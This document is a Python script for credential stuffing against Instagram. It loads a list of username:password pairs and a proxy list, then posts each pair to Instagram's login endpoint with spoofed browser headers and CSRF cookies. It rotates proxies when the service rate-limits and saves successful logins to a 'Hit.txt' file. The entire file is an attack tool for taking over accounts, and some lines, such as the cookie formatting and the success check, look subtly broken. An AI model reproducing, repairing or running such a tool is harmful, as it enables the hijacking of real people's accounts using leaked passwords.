#Models
import requests as r , Color as c , UserAgent as usr , Logo
#Headers
headers ={
        'Host':'www.instagram.com',
        'User-Agent': usr.UserAgent(),
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Referer': 'https://www.instagram.com/',
        'X-CSRFToken': '',
        'X-Instagram-AJAX': '1',
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Requested-With': 'XMLHttpRequest',
        'Content-Length': '',
        'Cookie': '',
        'Connection': 'keep-alive'
        }
#####....

#Globals Values
cambo=open(input(f"{c.C}Cambo{c.R}_{c.C}List {c.R}=> {c.W}"))
########
proxy=open(input(f"{c.C}Proxy{c.R}_{c.C}List {c.R}=> {c.W}"),"r").readlines()
#Proxies
def Proxies(num):
    pr=proxy[num].strip("\n")
    return pr

#########$  
for line, i in enumerate(cambo):
    try:
        user=i.split(":")[0]
        passw=i.split(":")[1]
    except Exception as e:
        print(f"{c.C}Error {c.R}=> {c.C}{e}{c.W}\n")
        exit()
    pr=Proxies(line)
    #pr=dict(https=f"{pr}",http=f"{pr}")
    pr={"http":pr}
    req=r.get("https://Instagram.com",proxies=pr,timeout=6)
    headers["X-CSRFToken"]=req.cookies["csrftoken"]
    headers["Cookie"]="mid{}; csrftoken{}; ig_pr=1; ig_vw=1366;".format(req.cookies["mid"],req.cookies["csrftoken"])
    ##########
    req=r.session()
    ok=req.post("https://Instagram.com/accounts/login/ajax/",headers=headers,data={"username":user,"password":passw}, proxies=pr, timeout=10)
    #print(ok,"\n")
    ip=Proxies(line)
    if "authenticated"": true" in ok.text:
        print(f"{c.C}UserName {c.R}=> {c.G}{user} {c.R}|| {c.C}Password {c.R}=> {c.G}{passw} {c.R}|| {c.C}Ip {c.R}=> {c.G}{ip}{c.W}\n")
        res=open("Hit.txt","a+")
        res.write(f"{user}:{passw}\n")
        res.close()
    elif 'Please wait a few minutes before you try again' in ok.text:
        print(f"{c.C}Bad Proxy{c.R}!!! \t {c.C}Change Proxy{c.R}...{c.W}\n")
        line += 1
        pr=Proxies(line)
        continue

    else:
        print(f"{c.G}UserName {c.C}=> {c.R}{user} {c.C}|| {c.G}Password {c.C}=> {c.R}{passw} {c.C}|| {c.G}Ip {c.C}=> {c.R}{ip}{c.W}\n")

